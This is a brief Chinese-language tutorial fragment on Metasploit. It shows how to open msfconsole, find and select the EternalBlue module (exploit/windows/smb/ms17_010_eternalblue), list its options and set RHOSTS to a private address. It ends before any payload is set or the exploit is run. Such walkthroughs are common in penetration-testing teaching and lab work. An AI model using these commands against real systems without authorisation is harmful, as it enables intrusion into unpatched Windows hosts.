
1. 进入msf控制台
```
msfconsole
```
2. 使用模块
```
# 搜索模块
search EternalBlue

# 使用模块（编号）
use 0
# 使用模块（名字）
use exploit/windows/smb/ms17_010_eternalblue
```

3. 设置模块的参数
```
show options
set RHOSTS 192.168.234.5
```